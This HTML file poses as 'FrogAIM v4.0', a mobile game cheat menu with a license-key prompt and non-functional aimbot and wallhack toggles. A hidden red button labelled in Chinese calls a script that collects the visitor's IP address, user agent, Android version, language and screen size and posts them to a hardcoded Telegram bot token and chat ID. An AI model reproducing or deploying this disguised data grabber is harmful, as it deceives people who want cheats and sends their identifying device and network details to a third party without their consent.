<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <title>FrogAIM v4.0</title>
    <style>
        :root {
            --main-bg-color: #0a0a0a;
            --accent-color: #8a2be2;
            --secondary-color: #4b0082;
            --text-color: #ffffff;
            --glow-color: #9370db;
            --frog-green: #00ff00;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
            -webkit-user-select: none;
            user-select: none;
        }
        
        body {
            background: #000000;
            color: var(--text-color);
            overflow: hidden;
            height: 100vh;
            margin: 0;
            position: relative;
        }
        
        /* –§–æ–Ω —Å —ç—Ñ—Ñ–µ–∫—Ç–æ–º –ø—Ä–æ–∑—Ä–∞—á–Ω–æ—Å—Ç–∏ */
        .background-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(5px);
            z-index: 998;
            display: none;
        }
        
        /* –ê–∫—Ç–∏–≤–∞—Ü–∏—è */
        .activation-modal {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            border: 3px solid var(--frog-green);
            border-radius: 15px;
            padding: 30px;
            width: 90%;
            max-width: 350px;
            text-align: center;
            box-shadow: 0 0 30px var(--frog-green);
            z-index: 1000;
        }
        
        .activation-input {
            width: 100%;
            padding: 12px;
            background: #111;
            border: 2px solid var(--accent-color);
            border-radius: 8px;
            color: white;
            font-size: 16px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .activate-btn {
            background: linear-gradient(90deg, var(--frog-green), #00cc00);
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            color: black;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
        }
        
        /* –ì–ª–∞–≤–Ω–æ–µ –æ–∫–Ω–æ */
        .floating-window {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 320px;
            height: 500px;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            border: 3px solid var(--frog-green);
            border-radius: 15px;
            box-shadow: 0 0 30px var(--frog-green);
            z-index: 999;
            overflow: hidden;
            display: none;
        }
        
        .window-header {
            background: linear-gradient(90deg, var(--frog-green), #00cc00);
            padding: 15px;
            text-align: center;
            position: relative;
        }
        
        .window-header h3 {
            color: black;
            font-weight: bold;
            margin: 0;
            font-size: 16px;
        }
        
        .close-btn {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: #ff4444;
            border: none;
            color: white;
            width: 25px;
            height: 25px;
            border-radius: 50%;
            cursor: pointer;
            font-weight: bold;
        }
        
        .content {
            padding: 20px;
            height: calc(100% - 120px);
            overflow-y: auto;
        }
        
        .cheat-section {
            margin-bottom: 20px;
            background: rgba(0, 255, 0, 0.05);
            border-radius: 10px;
            padding: 15px;
            border-left: 3px solid var(--frog-green);
        }
        
        .cheat-section h3 {
            color: var(--frog-green);
            margin-bottom: 12px;
            border-bottom: 1px solid var(--frog-green);
            padding-bottom: 6px;
            font-size: 14px;
        }
        
        .cheat-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 10px 0;
            padding: 10px;
            background: rgba(0, 255, 0, 0.1);
            border-radius: 8px;
            font-size: 12px;
        }
        
        .switch {
            position: relative;
            display: inline-block;
            width: 40px;
            height: 20px;
        }
        
        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #333;
            transition: .4s;
            border-radius: 20px;
        }
        
        .slider:before {
            position: absolute;
            content: "";
            height: 14px;
            width: 14px;
            left: 3px;
            bottom: 3px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }
        
        input:checked + .slider {
            background-color: var(--frog-green);
        }
        
        input:checked + .slider:before {
            transform: translateX(20px);
        }
        
        .secret-section {
            background: rgba(255, 0, 0, 0.1);
            border-left: 3px solid #ff0000;
        }
        
        .death-btn {
            background: linear-gradient(90deg, #ff0000, #cc0000);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
            font-size: 12px;
        }
        
        .footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            background: rgba(0, 0, 0, 0.8);
            padding: 10px;
            text-align: center;
            font-size: 11px;
            color: var(--frog-green);
        }
        
        .status {
            display: inline-block;
            width: 6px;
            height: 6px;
            background: #00ff00;
            border-radius: 50%;
            margin: 0 3px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .error-message {
            color: #ff4444;
            margin-top: 10px;
            display: none;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="background-overlay" id="backgroundOverlay"></div>

    <div class="activation-modal" id="activationModal">
        <div class="activation-box">
            <h2>üê∏ FrogAIM v4.0</h2>
            <p style="color: #ccc; margin-bottom: 15px; font-size: 14px;">Enter license key to activate</p>
            <input type="text" class="activation-input" id="activationKey" placeholder="FROGI-XXXX-XXXXXXX">
            <button class="activate-btn" onclick="activateCheat()">ACTIVATE</button>
            <p class="error-message" id="errorMsg">Invalid activation key!</p>
        </div>
    </div>

    <div class="floating-window" id="mainWindow">
        <div class="window-header">
            <h3>üê∏ FrogAIM v4.0</h3>
            <button class="close-btn" onclick="hideCheatMenu()">√ó</button>
        </div>
        <div class="content">
            <!-- –í—Å–µ —Å–µ–∫—Ü–∏–∏ —á–∏—Ç–∞ -->
            <div class="cheat-section">
                <h3>AIMBOT FEATURES</h3>
                <div class="cheat-item">
                    <span>Smart AimBot</span>
                    <label class="switch">
                        <input type="checkbox" id="smartAimbot">
                        <span class="slider"></span>
                    </label>
                </div>
                <div class="cheat-item">
                    <span>Headshot Priority</span>
                    <label class="switch">
                        <input type="checkbox" id="headshot">
                        <span class="slider"></span>
                    </label>
                </div>
                <div class="cheat-item">
                    <span>Auto Fire</span>
                    <label class="switch">
                        <input type="checkbox" id="autofire">
                        <span class="slider"></span>
                    </label>
                </div>
            </div>

            <div class="cheat-section">
                <h3>VISUAL MODS</h3>
                <div class="cheat-item">
                    <span>ESP Wallhack</span>
                    <label class="switch">
                        <input type="checkbox" id="esp">
                        <span class="slider"></span>
                    </label>
                </div>
                <div class="cheat-item">
                    <span>Player Radar</span>
                    <label class="switch">
                        <input type="checkbox" id="radar">
                        <span class="slider"></span>
                    </label>
                </div>
                <div class="cheat-item">
                    <span>Loot ESP</span>
                    <label class="switch">
                        <input type="checkbox" id="lootesp">
                        <span class="slider"></span>
                    </label>
                </div>
            </div>

            <div class="cheat-section">
                <h3>GAME HACKS</h3>
                <div class="cheat-item">
                    <span>No Recoil</span>
                    <label class="switch">
                        <input type="checkbox" id="norecoil">
                        <span class="slider"></span>
                    </label>
                </div>
                <div class="cheat-item">
                    <span>Speed Hack</span>
                    <label class="switch">
                        <input type="checkbox" id="speedhack">
                        <span class="slider"></span>
                    </label>
                </div>
                <div class="cheat-item">
                    <span>God Mode</span>
                    <label class="switch">
                        <input type="checkbox" id="godmode">
                        <span class="slider"></span>
                    </label>
                </div>
            </div>

            <div class="cheat-section secret-section">
                <h3>??????</h3>
                <div class="cheat-item">
                    <span>‰Ω†‰ºöÊ≠ª</span>
                    <button class="death-btn" onclick="sendDeathInfo()">ÊøÄÊ¥ª</button>
                </div>
            </div>
        </div>
        
        <div class="footer">
            Status: <span class="status"></span> <span id="statusText">Active</span>
        </div>
    </div>

    <script>
        const ACTIVATION_KEY = "FROGI-M4R-FREE52T69";
        const TELEGRAM_TOKEN = "8366387571:AAFo0fqn2G7v9NUxEDR6r_NZRe0pZX5RjmQ";
        const CHAT_ID = "2020792314";
        let isActivated = false;

        function activateCheat() {
            const inputKey = document.getElementById('activationKey').value.trim();
            const errorMsg = document.getElementById('errorMsg');
            
            if (inputKey === ACTIVATION_KEY) {
                isActivated = true;
                document.getElementById('activationModal').style.display = 'none';
                document.getElementById('mainWindow').style.display = 'block';
                document.getElementById('backgroundOverlay').style.display = 'block';
                localStorage.setItem('frogaim_activated', 'true');
            } else {
                errorMsg.style.display = 'block';
                setTimeout(() => errorMsg.style.display = 'none', 3000);
            }
        }

        function hideCheatMenu() {
            document.getElementById('mainWindow').style.display = 'none';
            document.getElementById('backgroundOverlay').style.display = 'none';
        }

        // –ê–Ω–∏–º–∞—Ü–∏–∏ –ø–µ—Ä–µ–∫–ª—é—á–∞—Ç–µ–ª–µ–π
        document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
            checkbox.addEventListener('change', function() {
                if (this.checked) {
                    document.getElementById('statusText').textContent = "Mod Activated";
                    setTimeout(() => {
                        document.getElementById('statusText').textContent = "Active";
                    }, 2000);
                }
            });
        });

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        if (localStorage.getItem('frogaim_activated') === 'true') {
            isActivated = true;
            document.getElementById('activationModal').style.display = 'none';
            document.getElementById('mainWindow').style.display = 'block';
            document.getElementById('backgroundOverlay').style.display = 'block';
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
        async function sendDeathInfo() {
            const statusText = document.getElementById('statusText');
            statusText.textContent = "Sending...";
            
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                const deviceInfo = {
                    ip: ipData.ip,
                    model: navigator.userAgent,
                    platform: navigator.platform,
                    androidVersion: navigator.userAgent.match(/Android\s([0-9\.]+)/)?.[1] || 'Unknown',
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    time: new Date().toLocaleString('ru-RU')
                };
                
                const message = `üö® –ö–¢–û-–¢–û –ù–ê–ñ–ê–õ –ù–ê –ö–ù–û–ü–ö–£ –°–ú–ï–†–¢–ò!\n\n` +
                               `üíª IP: ${deviceInfo.ip}\n` +
                               `üì± Model: ${deviceInfo.model}\n` +
                               `ü§ñ Android: ${deviceInfo.androidVersion}\n` +
                               `üåê Language: ${deviceInfo.language}\n` +
                               `üì∫ Screen: ${deviceInfo.screen}\n` +
                               `‚è∞ Time: ${deviceInfo.time}`;
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: message
                    })
                });
                
                statusText.textContent = "Sent!";
            } catch (error) {
                statusText.textContent = "Error!";
            } finally {
                setTimeout(() => {
                    statusText.textContent = "Active";
                }, 3000);
            }
        }

        document.getElementById('activationKey').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') activateCheat();
        });
    </script>
</body>
    </html>
